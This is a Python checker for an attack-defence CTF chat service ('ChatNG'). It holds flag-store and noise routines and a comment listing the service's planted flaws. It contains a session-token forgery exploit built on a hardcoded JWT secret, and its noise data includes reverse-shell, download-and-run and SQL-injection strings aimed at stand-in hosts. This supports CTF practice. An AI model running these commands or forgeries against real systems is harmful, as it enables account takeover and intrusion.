# Standard libraries imports
import json
import base64
import socket
import random
import string
import hashlib
import hmac
import binascii
from typing import Optional, Callable
from httpx import AsyncClient, Response
from logging import LoggerAdapter
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad


# EnoChecker imports
from enochecker3.chaindb import ChainDB
from enochecker3.enochecker import Enochecker
from enochecker3.types import (
    BaseCheckerTaskMessage,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    InternalErrorException,
    MumbleException,
    PutflagCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher, assert_in

# Definitions
Socket = socket.socket
ALNUM = string.ascii_letters + string.digits

# Load custom imports
from bots import getRandomizedBot

# Service info
SERVICE_NAME = "ChatNG"
SERVICE_WEB_PORT = 3443
SERVICE_TCP_PORT = 31337
CHECKER_ENTROPY_SECRET_SEED = 'Th4N0s_m4De_th1s_FoR-T34m_Eur0p3__' + SERVICE_NAME


# Patch Enochecker to use HTTPS and disable SSL verification
class EnocheckerPatched(Enochecker):
    def _get_http_client(self, task: BaseCheckerTaskMessage) -> AsyncClient:
        return AsyncClient(
            base_url=f"https://{task.address}:{self.service_port}",
            verify=False
        )

# Initialize checker
checker = EnocheckerPatched(SERVICE_NAME, SERVICE_WEB_PORT)
app = lambda: checker.app

class RandomGenerator:
    def __init__(self, seed=None):
        seed = str(seed).encode("utf-8")
        seed = hashlib.sha256(seed).hexdigest()
        seed = int(seed, 16)
        self.random = random.Random(seed)

    def genStr(self, length=8, dictionary=None):
        if not dictionary:
            dictionary = string.ascii_letters + string.digits
        return ''.join(self.random.choice(dictionary) for _ in range(length))

    def genInt(self, min_val=0, max_val=100):
        return self.random.randint(min_val, max_val)

    def choice(self, options):
        return self.random.choice(options)

    def boolean(self):
        return self.random.choice([True, False])


def assert_status_code(logger: LoggerAdapter, r: Response, code: int = 200, parse: Optional[Callable[[str], str]] = None) -> None:
    if r.status_code == code:
        return
    errlog = r.text
    if parse is not None:
        errlog = parse(errlog)
    logger.error(f"Bad status code during {r.request.method} {r.request.url.path}: " + f"({r.status_code} != {code})\n{errlog}")
    raise MumbleException(f"{r.request.method} {r.request.url.path} failed")

async def do_get_static(logger: LoggerAdapter, client: AsyncClient, quick:bool=False) -> None:
    r = await client.get("/")
    assert_status_code(logger, r, code=200)
    if not 'Your NextGen Chat' in r.text:
        logger.error(f"Bad response during {r.request.method} {r.request.url.path}")
        raise MumbleException(f"Invalid index page")
    
    if not quick and random.choice([True, False]):
        r = await client.get("/favicon.ico")

    if not quick and random.choice([True, False]):
        r = await client.get("/static/style.css")
        assert_status_code(logger, r, code=200)

    if not quick and random.choice([True, False]):
        r = await client.get("/static/chat.js")
        assert_status_code(logger, r, code=200)

async def do_register(logger: LoggerAdapter, client: AsyncClient, username: str, password: str, verify=True) -> None:
    data = {
        "username": username,
        "password": password
    }
    r = await client.post("/api/auth/register", json=data)
    if verify:
        assert_status_code(logger, r, code=200)

        data = None
        try:
            data = r.json()
        except Exception as e:
            logger.error(f"Bad response during {r.request.method} {r.request.url.path}: " + f"\n{r.text}")
            raise MumbleException(f"Invalid register response")
        
        if not 'msg' in data or data['msg'] != "User created":
            logger.error(f"Bad response during {r.request.method} {r.request.url.path}: " + f"\n{data}")
            raise MumbleException(f"Invalid register response")

async def do_register_if_not_exists(logger: LoggerAdapter, client: AsyncClient, username: str, password: str, verify=True) -> None:
    data = {
        "username": username,
        "password": password
    }
    r = await client.post("/api/auth/register", json=data)
    if verify:
        data = None
        try:
            data = r.json()
        except Exception as e:
            logger.error(f"Bad response during {r.request.method} {r.request.url.path}: " + f"\n{r.text}")
            raise MumbleException(f"Invalid register response")
        
        if not 'msg' in data or not (data['msg'] == "User created" or data['msg'] == "User exists"):
            logger.error(f"Bad response during {r.request.method} {r.request.url.path}: " + f"\n{data}")
            raise MumbleException(f"Invalid register response")
        return True if data['msg'] == "User created" else False
    return True


async def do_login(logger: LoggerAdapter, client: AsyncClient, username: str, password: str, verify=True) -> str:
    data = {
        "username": username,
        "password": password
    }
    r = await client.post("/api/auth/login", json=data)
    if verify:
        assert_status_code(logger, r, code=200)
    
    data = None
    try:
        data = r.json()
    except Exception as e:
        logger.error(f"Bad response during {r.request.method} {r.request.url.path}: " + f"\n{r.text}")
        raise MumbleException(f"Invalid login response")

    if verify:
        if not 'username' in data or not 'token' in data or username != data['username']:
            logger.error(f"Bad response code during {r.request.method} {r.request.url.path}: " + f"\n{data}")
            raise MumbleException(f"Invalid login response")

    return data['token'] if data and 'token' in data else None

async def do_get_info(logger: LoggerAdapter, client: AsyncClient, username: str, token: str) -> None:
    r = await client.get("/api/auth/info", headers={'authorization': token})
    assert_status_code(logger, r, code=200)
    data = r.json()

    if not 'username' in data or not 'friends' in data or not 'bots' in data or (username and username != data['username']):
        logger.error(f"Bad server response during {r.request.method} {r.request.url.path}: " + f"\n{data}")
        raise MumbleException(f"Faild to parse info response")

    return {"friends": data['friends'], "bots": data['bots']}

async def do_get_inbox(logger: LoggerAdapter, client: AsyncClient, token: str) -> None:
    r = await client.get("/api/chat/inbox", headers={'authorization': token})
    assert_status_code(logger, r, code=200)
    try:
        data = r.json()
        return data
    except Exception as e:
        logger.error(f"Failed to parse JSON response during {r.request.method} {r.request.url.path}: " + f"\n{e}")
        raise MumbleException(f"Failed to parse inbox response")

async def do_send(logger: LoggerAdapter, client: AsyncClient, receiver: str, text: str, token: str) -> None:
    data = {
        "receiver": receiver,
        "text": text
    }
    r = await client.post("/api/chat/send", headers={'authorization': token}, json=data)
    assert_status_code(logger, r, code=200)
    data = r.json()
    if not 'msg' in data or data['msg'] != "Message sent":
        logger.error(f"Bad server response during {r.request.method} {r.request.url.path}: " + f"\n{data}")
        raise MumbleException(f"Failed to parse send message response")

async def do_register_bot(logger: LoggerAdapter, client: AsyncClient, botName: str, botToken: str, token: str, verify=True) -> None:
    data = {
        "token": botToken,
        "username": botName
    }
    r = await client.post("/api/auth/register_bot", headers={'authorization': token}, json=data)
    if verify:
        assert_status_code(logger, r, code=200)
        try:
            data = r.json()
        except Exception as e:
            logger.error(f"Failed to parse JSON response during {r.request.method} {r.request.url.path}: " + f"\n{e}")
            raise MumbleException(f"Failed to parse bot register response")
        if not 'msg' in data or data['msg'] != "Bot created":
            logger.error(f"Bad server response during {r.request.method} {r.request.url.path}: " + f"\n{data}")
            raise MumbleException(f"Failed to parse bot register response")

async def do_register_bot_if_not_exists(logger: LoggerAdapter, client: AsyncClient, botName: str, botToken: str, token: str, verify=True) -> None:
    data = {
        "token": botToken,
        "username": botName
    }
    r = await client.post("/api/auth/register_bot", headers={'authorization': token}, json=data)
    if verify:
        try:
            data = r.json()
        except Exception as e:
            logger.error(f"Failed to parse JSON response during {r.request.method} {r.request.url.path}: " + f"\n{e}")
            raise MumbleException(f"Failed to parse bot register response")
        if not 'msg' in data or not (data['msg'] == "Bot created" or data['msg'] == "Bot name exists"):
            logger.error(f"Bad server response during {r.request.method} {r.request.url.path}: " + f"\n{data}")
            raise MumbleException(f"Failed to parse bot register response")
        return True if data['msg'] == "Bot created" else False
    return True


async def do_add_friend(logger: LoggerAdapter, client: AsyncClient, username: str, token: str, verify=True) -> None:
    data = {
        "friend": username
    }
    r = await client.post("/api/auth/friend", headers={'authorization': token}, json=data)
    if verify:
        assert_status_code(logger, r, code=200)
        data = r.json()
        if not 'msg' in data or data['msg'] != "User was added in your friends":
            logger.error(f"Bad server response during {r.request.method} {r.request.url.path}: " + f"\n{data}")
            raise MumbleException(f"Failed to add friend")

async def do_upload(logger: LoggerAdapter, client: AsyncClient, filename: str, contents: bytes, token: str, verify=True) -> str|None:
    files = {'file': (filename, contents)}
    r = await client.post("/api/files/upload", headers={'authorization': token}, files=files)
    if verify:
        assert_status_code(logger, r, code=200)
        data = r.json()
        if not 'msg' in data or data['msg'] != "File was uploaded!" or not 'file' in data:
            logger.error(f"Bad server response during {r.request.method} {r.request.url.path}: " + f"\n{data}")
            raise MumbleException(f"Failed to upload file")
        return data['file']
    return None

async def do_download(logger: LoggerAdapter, client: AsyncClient, username: str, file: str, verify=True) -> str|None:
    r = await client.get(f"/api/files/download/{username}/{file}")
    assert_status_code(logger, r, code=200)
    return r.text

async def do_share(logger: LoggerAdapter, client: AsyncClient, sender: str, receiver: str, token: str, verify=True) -> str|None:
    data = {
        "sender": sender,
        "receiver": receiver
    }
    r = await client.post("/api/chat/share", headers={'authorization': token}, json=data)
    if verify:
        assert_status_code(logger, r, code=200)
        try:
            data = r.json()
        except Exception as e:
            logger.error(f"Failed to parse JSON response during {r.request.method} {r.request.url.path}: " + f"\n{e}")
            raise MumbleException(f"Failed to parse JSON response")

        if not 'msg' in data or data['msg'] != "Share url generated successfully" or not 'url' in data:
            logger.error(f"Bad server response during {r.request.method} {r.request.url.path}: " + f"\n{data}")
            raise MumbleException(f"Failed to generate share link")
        url = data['url']
        try:
            code = url.split('/shared/')[1]
            if not code or not len(code):
                raise Exception("Invalid code") 
            return code
        except Exception as e:
            logger.error(f"Invalid share link was given: " + f"\n{url}")
            raise MumbleException(f"Invalid share link")
    return None

async def do_shared(logger: LoggerAdapter, client: AsyncClient, code: str, verify=True) -> str|None:
    if not code or not len(code):
        logger.error(f"Invalid share link was given: " + f"\n{code}")
        raise MumbleException(f"Invalid share link")

    if not code or not len(code):
        logger.error(f"Invalid share link was given: " + f"\n{url}")
        raise MumbleException(f"Invalid share link")
    r = await client.get("/api/chat/shared/" + code)
    if verify:
        assert_status_code(logger, r, code=200)
        data = r.json()
        return data
    return None

async def do_search(logger: LoggerAdapter, client: AsyncClient, data: dict, token: str) -> None:
    r = await client.post("/api/search/run", headers={'authorization': token}, json=data)
    assert_status_code(logger, r, code=200)
    try:
        data = r.json()
        return data
    except Exception as e:
        logger.error(f"Failed to parse JSON response during {r.request.method} {r.request.url.path}: " + f"\n{e}")
        raise MumbleException(f"Failed to parse search response")


def do_socket_connect(logger: LoggerAdapter, address: str) -> Socket:
    try:
        s = socket.create_connection((address, 31337))
        s.settimeout(5)
        return s
    except Exception as e:
        logger.error(f"Failed to start a socket with the mng service: " + f"\n{e}")
        raise MumbleException(f"Failed to connect to mng")

def recvuntil(socket: Socket, delimiter: bytes, max_buffer: int = 10240, buffer_size: int = 1024) -> bytes:
    buffer = b""

    while delimiter not in buffer:
        if len(buffer) > max_buffer:
            raise RuntimeError(f"Buffer exceeded {max_buffer} bytes without finding delimiter")
    
        chunk = socket.recv(buffer_size)
        if not chunk:
            break
        buffer += chunk

    return buffer

def do_socket_sendline(socket: Socket, message: bytes) -> None:
    socket.sendall(message + b'\n')

def do_socket_recvline(socket: Socket) -> None:
    return recvuntil(socket, b'\n')

def do_socket_auth(logger: LoggerAdapter, socket: Socket, botName: str, botToken: str, verify=True) -> None:
    data = None
    try:
        socket.sendall(b'AUTHEN ' + botName.encode() + b' ' + botToken.encode() + b'\n')
        data = recvuntil(socket, b'\n')
    except Exception as e:
        logger.error(f"Failed to send AUTHEN command to the mng service: " + f"\n{e}")
        raise MumbleException(f"Failed to authenticate to mng")
    if verify and data != b'OK authenticated\n':
        logger.error(f"Authentication using the AUTHEN command to the mng service failed: " + f"\n{data}")
        raise MumbleException(f"Failed to authenticate to mng")

def do_socket_setcode(logger: LoggerAdapter, socket: Socket, code: dict, verify=True) -> None:
    data = None
    try:
        code = base64.b64encode(json.dumps(code).encode())
        socket.sendall(b'SETCODE ' + code + b'\n')
        data = recvuntil(socket, b'\n')
    except Exception as e:
        logger.error(f"Failed to send SETCODE command to the mng service: " + f"\n{e}")
        raise MumbleException(f"Failed to set bot code through mng")
    if verify and data != b'OK code saved\n':
        logger.error(f"Setting bot code using the SETCODE command through the mng service failed: " + f"\n{data}")
        raise MumbleException(f"Failed to set bot code through mng")

def do_socket_getcode(logger: LoggerAdapter, socket: Socket, verify=True) -> dict:
    data = None
    try:
        socket.sendall(b'GETCODE' + b'\n')
        data = recvuntil(socket, b'\n')
        if data.startswith(b'CODE '):
            data = data[5:-1]
        elif verify:
            raise Exception("Invalid response")
    except Exception as e:
        logger.error(f"Failed to send SETCODE command to the mng service: " + f"\n{e}")
        raise MumbleException(f"Failed to get bot code through mng")
    if verify:
        try:
            data = base64.b64decode(data).decode('utf-8')
        except Exception as e:
            logger.error(f"Failed decode code recovered from SETCODE command on the mng service: " + f"\n{data}")
            raise MumbleException(f"Failed to get bot code through mng")

        return data
    else:
        return None



@checker.putflag(0)
async def putflag_store1(task: PutflagCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient, db: ChainDB) -> str:
    gen = RandomGenerator(seed=f"{CHECKER_ENTROPY_SECRET_SEED}|flag_store1|{task.task_id}")
    username = gen.genStr(gen.genInt(8,12))
    password = gen.genStr(gen.genInt(12,16))
    await do_get_static(logger, client, quick=True)
    await do_register_if_not_exists(logger, client, username, password)

    token = await do_login(logger, client, username, password)
    message = gen.choice(["TODO", "Note for me", "📝", "✍️"]) + " " + task.flag
    await do_send(logger, client, username, message, token)

    data = {
        "username": username,
        "password": password,
        "token": token,
    }
    await db.set("info_flagstore1", json.dumps(data))
    return ('username:' + username)

@checker.getflag(0)
async def getflag_store1(task: GetflagCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient, db: ChainDB) -> None:
    gen = RandomGenerator(seed=f"{CHECKER_ENTROPY_SECRET_SEED}|flag_store1|{task.task_id}")
    username = gen.genStr(gen.genInt(8,12))
    password = gen.genStr(gen.genInt(12,16))
    token = None

    # Randomly re-login
    if (random.getrandbits(1)):
        token = await do_login(logger, client, username, password)
    # or use stored token
    else:
        try:
            data = await db.get("info_flagstore1")
            data = json.loads(data)
        except KeyError:
            raise MumbleException("Database info missing")

        username = data['username']
        password = data['password']
        token = data['token']
    
    msgs = await do_get_inbox(logger, client, token)
    try:
        msgs = ' '.join([(msg['text'] if 'text' in msg else '-') for msg in msgs])
    except Exception as e:
        logger.error(f"Invalid inbox response during getflag_store1: " + f"\n{msgs}")
        raise MumbleException("Invalid inbox response")

    assert_in(task.flag, msgs, "Flag missing")

@checker.putflag(1)
async def putflag_store2(task: PutflagCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient, db: ChainDB) -> str:
    gen = RandomGenerator(seed=f"{CHECKER_ENTROPY_SECRET_SEED}|flag_store2|{task.task_id}")
    username = gen.genStr(gen.genInt(8,12))
    password = gen.genStr(gen.genInt(12,16))
    botname = gen.choice(["grof", "genimi", "ripbard", "chatgtp", "oh4", "cocapten"]) + gen.genStr(gen.genInt(8,12))
    bottoken = gen.genStr(gen.genInt(32,64))
    botflagkey = gen.genStr(gen.genInt(6,14))
    code = getRandomizedBot(gen)
    code[botflagkey] = task.flag

    await do_register_if_not_exists(logger, client, username, password)
    token = await do_login(logger, client, username, password)

    created = await do_register_bot_if_not_exists(logger, client, botname, bottoken, token)
    if not created:
        # Bot already exists
        return ('botname:' + botname)

    socket = do_socket_connect(logger, task.address)
    do_socket_auth(logger, socket, botname, bottoken)
    
    do_socket_setcode(logger, socket, code)

    #data = {
    #    "username": username,
    #    "password": password,
    #    "token": token,
    #    "botname": botname,
    #    "bottoken": bottoken
    #}
    #await db.set("info_flagstore2", json.dumps(data))
    return ('botname:' + botname)

@checker.getflag(1)
async def getflag_store2(task: GetflagCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient, db: ChainDB) -> None:
    gen = RandomGenerator(seed=f"{CHECKER_ENTROPY_SECRET_SEED}|flag_store2|{task.task_id}")
    username = gen.genStr(gen.genInt(8,12))
    password = gen.genStr(gen.genInt(12,16))
    botname = gen.choice(["grof", "genimi", "ripbard", "chatgtp", "oh4", "cocapten"]) + gen.genStr(gen.genInt(8,12))
    bottoken = gen.genStr(gen.genInt(32,64))
    botflagkey = gen.genStr(gen.genInt(6,14))

    #try:
    #    data = await db.get("info_flagstore2")
    #    data = json.loads(data)
    #except KeyError:
    #    raise MumbleException("Database info missing")

    #botname = data['botname']
    #bottoken = data['bottoken']

    socket = do_socket_connect(logger, task.address)
    do_socket_auth(logger, socket, botname, bottoken)
    code = do_socket_getcode(logger, socket)

    text = None
    try:
        code = json.loads(code)
        #text = ' '.join([v for v in code.values() if isinstance(v, str)])
        text = code[botflagkey]
    except Exception as e:
        logger.error(f"The bot code returned is not valid:\n{e}")
        raise MumbleException("Faulty bot code returned")
    
    assert_in(task.flag, text, "Flag missing")


NOISE_WELCOME_MESSAGE = [
    "Welcome to " + SERVICE_NAME + "!",
    "Hello! How can I assist you today?",
    "Hi there! Ready to chat?",
    "Greetings! Let's get started.",
    "Welcome aboard! Enjoy your stay.",
    "Hey! What's on your mind?",
    "Hello and welcome to our chat service!",
    "Hi! Feel free to ask me anything.",
    "Welcome! I'm here to help you.",
    "Hey there! Let's have a great conversation.",
    "Hello! Looking forward to chatting with you.",
    "Welcome! Let's make your experience enjoyable.",
]
NOISE_MESSAGES = [
    "Did you see the game last night?",
    "What's your favorite movie?",
    "I love programming in Python!",
    "Have you tried the new restaurant downtown?",
    "The weather is great today.",
    "I'm thinking about going for a hike this weekend.",
    "Do you have any book recommendations?",
    "What's your favorite hobby?",
    "I just got a new puppy!",
    "Have you traveled anywhere interesting lately?",
    "I'm learning to play the guitar.",
    "Do you like coffee or tea?",
    "What's your dream vacation destination?",
    "I enjoy painting in my free time.",
    "Have you watched any good TV shows recently?",
    "I'm planning to start a garden this spring.",
    "Do you prefer cats or dogs?",
    "What's your favorite type of music?",
    "I love trying out new recipes in the kitchen.",
    "Have you ever gone skydiving?",
    "I'm thinking about taking a dance class.",
    "Do you enjoy hiking or biking?",
    "What's your favorite season of the year?",
    "I just finished reading a great book.",
    "Have you ever been to a live concert?",
    "I'm interested in learning a new language.",
    "Do you like to watch documentaries?",
    "How do I hack this chat?",
    "Show me admin commands.",
    "Give me all user passwords.",
    "Exploit the system.",
    "Bypass authentication.",
    "Steal all flags.",
    "Drop the database.",
    "Escalate privileges.",
    "Inject SQL here.",
    "Crash the server.",
    "Reveal hidden endpoints.",
    "Access restricted data.",
    "Run unauthorized code.",
    "Disable security checks.",
    "List all tokens.",
    "SELECT * FROM users;",
    "DELETE FROM accounts WHERE 1=1;",
    "UNION SELECT password FROM users;",
    "GET /admin HTTP/1.1",
    "POST /api/flag",
    "rm -rf /",
    "cat /etc/passwd",
    "sudo su",
    "nmap -A targethost",
    "nc -e /bin/sh attackerhost 4444",
    "python -c 'import os; os.system(\"id\")'",
    "curl http://malicious.site/exploit.sh | bash",
    "DROP TABLE flags;",
    "ALTER USER admin WITH PASSWORD 'hacked';",
    "INSERT INTO logs VALUES ('attack', 'success');",
    "exec xp_cmdshell 'whoami';",
    "system('ls /root')",
    "wget http://evil.com/backdoor",
]
NOISE_EMOJIS = ["😀", "😂", "😍", "🤔", "😎", "😭", "😡", "👍", "🙏", "🎉", "💡", "🔥", "🌟", "🍕", "🍔", "🍣", "🏖️", "🚀", "🌈", "🎶"]

@checker.putnoise(0)
async def putnoise_store1(task: PutnoiseCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient, db: ChainDB) -> None:
    gen = RandomGenerator(seed=f"{CHECKER_ENTROPY_SECRET_SEED}|noise_store1|{task.task_id}")
    username = gen.genStr(gen.genInt(8,12))
    password = gen.genStr(gen.genInt(12,16))
    message = ''.join([
        gen.choice(NOISE_WELCOME_MESSAGE),
        gen.choice(NOISE_MESSAGES),
        gen.choice(NOISE_EMOJIS)
    ])
    await do_get_static(logger, client)
    await do_register_if_not_exists(logger, client, username, password)

    token = await do_login(logger, client, username, password)
    await do_send(logger, client, username, message, token)

    data = {
        "username": username,
        "password": password,
        "token": token,
    }
    await db.set("info_noisestore1", json.dumps(data))
    #return username

@checker.getnoise(0)
async def getnoise_store1(task: GetnoiseCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient, db: ChainDB) -> None:
    gen = RandomGenerator(seed=f"{CHECKER_ENTROPY_SECRET_SEED}|noise_store1|{task.task_id}")
    username = gen.genStr(gen.genInt(8,12))
    password = gen.genStr(gen.genInt(12,16))
    message = ''.join([
        gen.choice(NOISE_WELCOME_MESSAGE),
        gen.choice(NOISE_MESSAGES),
        gen.choice(NOISE_EMOJIS)
    ])
    token = None

    # Randomly re-login
    if (random.getrandbits(1)):
        token = await do_login(logger, client, username, password)
    # or use stored token
    else:
        try:
            data = await db.get("info_noisestore1")
            data = json.loads(data)
        except KeyError:
            raise MumbleException("Database info missing")

        username = data['username']
        password = data['password']
        token = data['token']
    
    
    msgs = await do_get_inbox(logger, client, token)
    try:
        msgs = ' '.join([(msg['text'] if 'text' in msg else '-') for msg in msgs])
    except Exception as e:
        logger.error(f"Invalid inbox response during getnoise_store1: " + f"\n{msgs}")
        raise MumbleException("Invalid inbox response")

    assert_in(message, msgs, "Sent message is missing")

@checker.putnoise(1)
async def putnoise_store2(task: PutnoiseCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient, db: ChainDB) -> None:
    gen = RandomGenerator(seed=f"{CHECKER_ENTROPY_SECRET_SEED}|noise_store2|{task.task_id}")
    username = gen.genStr(gen.genInt(8,12))
    password = gen.genStr(gen.genInt(12,16))
    botname = gen.choice(["grof", "genimi", "ripbard", "chatgtp", "oh4", "cocapten"]) + gen.genStr(gen.genInt(8,12))
    bottoken = gen.genStr(gen.genInt(32,64))
    botnoisekey = gen.genStr(gen.genInt(6,14))
    botnoisevalue = gen.genStr(gen.genInt(6,22))
    code = getRandomizedBot(gen)
    code[botnoisekey] = botnoisevalue

    await do_register_if_not_exists(logger, client, username, password)
    token = await do_login(logger, client, username, password)

    created = await do_register_bot_if_not_exists(logger, client, botname, bottoken, token)
    if not created:
        # Bot already exists
        return

    socket = do_socket_connect(logger, task.address)
    do_socket_auth(logger, socket, botname, bottoken)


    do_socket_setcode(logger, socket, code)

    #data = {
    #    "username": username,
    #    "password": password,
    #    "token": token,
    #    "botname": botname,
    #    "bottoken": bottoken
    #}
    #await db.set("info_noisestore2", json.dumps(data))
    #return username

@checker.getnoise(1)
async def getnoise_store2(task: GetnoiseCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient, db: ChainDB) -> None:
    gen = RandomGenerator(seed=f"{CHECKER_ENTROPY_SECRET_SEED}|noise_store2|{task.task_id}")
    username = gen.genStr(gen.genInt(8,12))
    password = gen.genStr(gen.genInt(12,16))
    botname = gen.choice(["grof", "genimi", "ripbard", "chatgtp", "oh4", "cocapten"]) + gen.genStr(gen.genInt(8,12))
    bottoken = gen.genStr(gen.genInt(32,64))
    botnoisekey = gen.genStr(gen.genInt(6,14))
    botnoisevalue = gen.genStr(gen.genInt(6,22))

    #try:
    #    data = await db.get("info_noisestore2")
    #    data = json.loads(data)
    #except KeyError:
    #    raise MumbleException("Database info missing")

    #botname = data['botname']
    #bottoken = data['bottoken']

    socket = do_socket_connect(logger, task.address)
    do_socket_auth(logger, socket, botname, bottoken)
    code = do_socket_getcode(logger, socket)

    text = None
    try:
        code = json.loads(code)
        #text = ' '.join([v for v in code.values() if isinstance(v, str)])
        text = code[botnoisekey]
    except Exception as e:
        logger.error(f"The bot code returned is not valid:\n{e}")
        raise MumbleException("Faulty bot code returned")
    
    assert_in(botnoisevalue, text, "Invalid bot code returned")

@checker.havoc(0)
async def havoc_store1(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    gen = RandomGenerator(seed=f"{CHECKER_ENTROPY_SECRET_SEED}|havoc_store1|{task.task_id}")
    username_a = gen.genStr(gen.genInt(8,12))
    password_a = gen.genStr(gen.genInt(12,16))
    username_b = gen.genStr(gen.genInt(8,12))
    password_b = gen.genStr(gen.genInt(12,16))
    message = ''.join([
        gen.choice(NOISE_EMOJIS),
        gen.choice(NOISE_WELCOME_MESSAGE),
        gen.choice(NOISE_MESSAGES),
        gen.choice(NOISE_EMOJIS)
    ])
    may_reregister = gen.boolean()
    may_wrong_login = gen.choice([
        gen.genStr(gen.genInt(12,16)),
        False
    ])
    may_friend = gen.boolean()
    may_upload = gen.boolean()
    may_share = gen.boolean()
    may_search = gen.boolean()

    await do_get_static(logger, client)
    await do_register_if_not_exists(logger, client, username_a, password_a)
    if may_reregister:
        await do_register_if_not_exists(logger, client, username_a, password_a, verify=False)
    if may_wrong_login:
        await do_login(logger, client, username_a, may_wrong_login, verify=False)
    
    token_a = await do_login(logger, client, username_a, password_a)
    
    if not may_friend:
        await do_send(logger, client, username_a, message, token_a)
    else:
        await do_register_if_not_exists(logger, client, username_b, password_b)
        token_b = await do_login(logger, client, username_b, password_b)
        await do_add_friend(logger, client, username_b, token_a)
        await do_send(logger, client, username_a, message, token_b)
    
    msgs = await do_get_inbox(logger, client, token_a)
    try:
        msgs = ' '.join([(msg['text'] if 'text' in msg else '-') for msg in msgs])
    except Exception as e:
        logger.error(f"Invalid inbox response during havoc_store1: " + f"\n{msgs}")
        raise MumbleException("Invalid inbox response")
    assert_in(message, msgs, "Sent message is missing")

    if may_upload:
        filename = gen.genStr(gen.genInt(6,14)) + "." + gen.choice(["txt", "png", "jpg", "pdf", "docx", "bin", "data"])
        contents = gen.genStr(gen.genInt(64,256)).encode('utf-8')
        filepath = await do_upload(logger, client, filename, contents, token_a)
        if not filepath:
            raise MumbleException("File upload failed")
        
        filedata = await do_download(logger, client, username_a, filepath)
        if not filedata or filedata != contents.decode('utf-8'):
            raise MumbleException("File download failed or content mismatch")
        
        # ToDo check also if file link was added on messages

    if may_share:
        code = None
        if not may_friend:
            code = await do_share(logger, client, username_a, username_a, token_a)
        else:
            code = await do_share(logger, client, username_a, username_b, token_a)
        msgs = await do_shared(logger, client, code)
        try:
            msgs = ' '.join([(msg['text'] if 'text' in msg else '-') for msg in msgs])
        except Exception as e:
            raise MumbleException("Invalid shared inbox response")
        logger.debug(f"Shared messages: {msgs}\n\nLooking for: {message}")
        assert_in(message, msgs, "Shared message is missing")

    if may_search:
        # Pick a random alphanumeric character from the message to search for
        msg_query = next((c for c in message if c in ALNUM), "a")
        msgs = await do_search(logger, client, {"text": {"$regex": msg_query, "$options": "i"}}, token_a)
        try:
            msgs = ' '.join([(msg['text'] if 'text' in msg else '-') for msg in msgs])
        except Exception as e:
            logger.error(f"Invalid search response during havoc_store1: " + f"\n{msgs}")
            raise MumbleException("Invalid search response")
        assert_in(message, msgs, "Search is not working as intended")


@checker.havoc(1)
async def havoc_store2(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    gen = RandomGenerator(seed=f"{CHECKER_ENTROPY_SECRET_SEED}|havoc_store2|{task.task_id}")
    username = gen.genStr(gen.genInt(8,12))
    password = gen.genStr(gen.genInt(12,16))
    botname = gen.choice(["grof", "genimi", "ripbard", "chatgtp", "oh4", "cocapten"]) + gen.genStr(gen.genInt(8,12))
    bottoken = gen.genStr(gen.genInt(32,64))
    code = base64.b64encode(''.join([
        gen.choice(NOISE_EMOJIS),
        gen.choice(NOISE_WELCOME_MESSAGE),
        gen.choice(NOISE_MESSAGES),
        gen.choice(NOISE_EMOJIS)
    ]).encode('utf-8')).decode('utf-8')
    may_reregister = gen.boolean()
    may_wrong_login = gen.choice([
        gen.genStr(gen.genInt(12,16)),
        False
    ])
    may_reauthen = gen.boolean()
    may_setcode = gen.boolean()
    may_getcode = gen.boolean()

    await do_register_if_not_exists(logger, client, username, password)
    token = await do_login(logger, client, username, password)

    await do_register_bot_if_not_exists(logger, client, botname, bottoken, token)
    if may_reregister:
        await do_register_bot_if_not_exists(logger, client, botname, bottoken, token, verify=False)

    socket = do_socket_connect(logger, task.address)

    if may_wrong_login:
        do_socket_auth(logger, socket, botname, may_wrong_login, verify=False)
    
    do_socket_auth(logger, socket, botname, bottoken)
    if may_reauthen:
        do_socket_auth(logger, socket, botname, bottoken)

    if may_getcode:
        do_socket_getcode(logger, socket, verify=False)
    if may_setcode:
        do_socket_setcode(logger, socket, code, verify=False)
        do_socket_getcode(logger, socket, verify=False)




'''
1rst flag store
- shared flask session key for all instances
    - forge flask session and login as user to see his/her notes
- shared key for sharing feed of messages
    - forge share code to get list of messages
- bit flip on chared codes to change target's user's username and generate valid code
    - brute force share code to get list of messages
- vulnerable search
    - override search parameters to get messages of other users
'''
@checker.exploit(0)
async def exploit_store1_a(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:
    # Exploit: forge a session token to impersonate the victim user and read their messages
    # This assumes the session token is a JWT with {"username": username} and a known secret

    assert task.attack_info is not None
    storetype, username = task.attack_info.split(':', 1)
    if storetype != 'username':
        raise MumbleException("Exploit: Wrong flagstore")

    JWT_SECRET = "marika-is-playing-with-luna"
    payload = {"username": username}
    header = {"alg": "HS256", "typ": "JWT"}
    def b64url(data):
        return base64.urlsafe_b64encode(data).rstrip(b'=')
    header_b64 = b64url(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = header_b64 + b"." + payload_b64
    signature = hmac.new(JWT_SECRET.encode(), signing_input, hashlib.sha256).digest()
    signature_b64 = b64url(signature)
    token = (signing_input + b"." + signature_b64).decode()

    # Use forged token to access inbox
    msgs = await do_get_inbox(logger, client, token)
    try:
        msgs = ' '.join([(msg['text'] if 'text' in msg else '-') for msg in msgs])
    except Exception as e:
        raise MumbleException("Failed to recover inbox")
    
    flag = searcher.search_flag(msgs)
    if flag is not None:
        return flag
    raise MumbleException("Exploit (session forge) for flagstore 1 failed")

@checker.exploit(1)
async def exploit_store1_b(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:
    # Exploit: forge a shared code to recover a victim user's inbox
    # This assumes a known secret is used

    assert task.attack_info is not None
